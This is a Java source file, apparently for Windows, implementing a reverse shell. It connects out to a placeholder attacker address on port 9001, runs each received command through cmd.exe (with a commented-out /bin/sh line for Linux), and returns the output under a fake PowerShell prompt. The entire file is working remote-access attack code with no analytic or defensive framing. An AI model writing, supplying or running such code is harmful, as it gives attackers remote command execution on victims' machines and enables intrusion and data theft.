//Windows 
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

public class ReverseShell {
    private static final String HOST = "IP_ADDRESS";
    private static final int PORT = 9001;

    public static void main(String[] args) {
        Socket socket = null;
        BufferedReader in = null;
        PrintWriter out = null;
        BufferedReader processInput = null;
        BufferedReader processError = null;

        try {
            // Create TCP socket and connect
            socket = new Socket(HOST, PORT);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);

            while (true) {
                // Receive data from the server
                char[] buffer = new char[65536];
                int bytesRead = in.read(buffer);
                if (bytesRead == -1) {
                    break;
                }

                // Decode the command
                String command = new String(buffer, 0, bytesRead).trim();

                try {
                    // Execute the command
                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("cmd.exe", "/c", command); // For Windows
                    // processBuilder.command("/bin/sh", "-c", command); // For Linux

                    Process process = processBuilder.start();

                    // Set timeout for the process
                    boolean completed = process.waitFor(30, TimeUnit.SECONDS);

                    if (!completed) {
                        process.destroy();
                        throw new InterruptedException("Command timed out");
                    }

                    // Read output from the process
                    processInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    processError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                    StringBuilder output = new StringBuilder();
                    String line;

                    while ((line = processInput.readLine()) != null) {
                        output.append(line).append("\n");
                    }

                    while ((line = processError.readLine()) != null) {
                        output.append(line).append("\n");
                    }

                    // Add current directory prompt
                    String currentDir = System.getProperty("user.dir");
                    String sendback = output.toString() + "\nPS " + currentDir + "> ";

                    // Send response back
                    out.print(sendback);
                    out.flush();

                } catch (InterruptedException e) {
                    String currentDir = System.getProperty("user.dir");
                    String sendback = "Error: Command timed out\nPS " + currentDir + "> ";
                    out.print(sendback);
                    out.flush();
                } catch (Exception e) {
                    String currentDir = System.getProperty("user.dir");
                    String sendback = "Error: " + e.getMessage() + "\nPS " + currentDir + "> ";
                    out.print(sendback);
                    out.flush();
                }
            }
        } catch (Exception e) {
            System.err.println("Connection error: " + e.getMessage());
        } finally {
            try {
                if (in != null) in.close();
                if (out != null) out.close();
                if (processInput != null) processInput.close();
                if (processError != null) processError.close();
                if (socket != null) socket.close();
            } catch (IOException e) {
                // Ignore
            }
        }
    }
}
